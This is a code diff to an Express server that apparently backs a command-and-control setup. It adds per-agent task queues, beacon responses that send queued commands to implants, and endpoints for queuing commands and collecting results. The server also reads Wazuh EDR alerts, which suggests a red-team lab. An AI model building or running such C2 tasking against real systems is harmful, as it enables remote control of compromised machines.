@@ -10,6 +10,7 @@ const c2app = express();
 
 // Minimal PEM CN extractor using built-in crypto
 const agents = new Map();
+const taskQueue = new Map(); // agentID -> [{ id, cmd, args, status, createdAt, result }]
 const geoip = require('geoip-lite');
 const extractCN = (pem) => {
   try {
@@ -66,7 +67,8 @@ app.use((req, res, next) => {
     // Fallback to the dashboard host to keep dev UX working when Origin is absent
     res.header('Access-Control-Allow-Origin', allowed[0]);
   }
-  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, X-Agent-ID');
+  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
+  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, X-Agent-ID, Authorization');
   res.header('Access-Control-Allow-Credentials', 'true');
   if (req.method === 'OPTIONS') {
     return res.sendStatus(200);
@@ -298,12 +300,81 @@ c2app.post('/beacon', (req, res) => {
     agents.set(agentID, agent);
   })();
 
-  res.status(200).send('OK');
+  // Check for pending tasks and send them to the agent
+  const tasks = taskQueue.get(agentID) || [];
+  const pendingTasks = tasks.filter(t => t.status === 'pending');
+  
+  if (pendingTasks.length > 0) {
+    // Mark tasks as sent
+    pendingTasks.forEach(t => t.status = 'sent');
+    taskQueue.set(agentID, tasks);
+    // Return tasks in response
+    return res.status(200).json({ tasks: pendingTasks.map(t => ({ id: t.id, cmd: t.cmd, args: t.args })) });
+  }
+
+  res.status(200).json({ tasks: [] });
 });
 
 // Dashboard endpoint
 app.get('/api/agents', (req, res) => {
   res.json(Array.from(agents.values()));
+});
+
+// Task management endpoints
+// Create a new task for an agent
+app.post('/api/agents/:agentId/tasks', (req, res) => {
+  const agentId = req.params.agentId;
+  const { cmd, args } = req.body;
+  
+  if (!cmd) {
+    return res.status(400).json({ error: 'cmd is required' });
+  }
+  
+  const tasks = taskQueue.get(agentId) || [];
+  const task = {
+    id: `task-${Date.now()}-${Math.random().toString(36).slice(2, 9)}`,
+    cmd,
+    args: args || [],
+    status: 'pending',
+    createdAt: new Date().toISOString(),
+    result: null
+  };
+  
+  tasks.push(task);
+  taskQueue.set(agentId, tasks);
+  
+  console.log(`Created task ${task.id} for agent ${agentId}: ${cmd} ${JSON.stringify(args)}`);
+  res.json(task);
+});
+
+// Get tasks for an agent
+app.get('/api/agents/:agentId/tasks', (req, res) => {
+  const agentId = req.params.agentId;
+  const tasks = taskQueue.get(agentId) || [];
+  res.json(tasks);
+});
+
+// Receive task results from agent
+app.post('/api/agents/:agentId/tasks/:taskId/result', (req, res) => {
+  const { agentId, taskId } = req.params;
+  const { result, error, status } = req.body;
+  
+  const tasks = taskQueue.get(agentId) || [];
+  const task = tasks.find(t => t.id === taskId);
+  
+  if (!task) {
+    return res.status(404).json({ error: 'Task not found' });
+  }
+  
+  task.status = status || 'completed';
+  task.result = result;
+  task.error = error;
+  task.completedAt = new Date().toISOString();
+  
+  taskQueue.set(agentId, tasks);
+  console.log(`Task ${taskId} for agent ${agentId} completed with status: ${task.status}`);
+  
+  res.json(task);
 });
 
 // EDR Alerts endpoint — read Wazuh alerts from volume as root
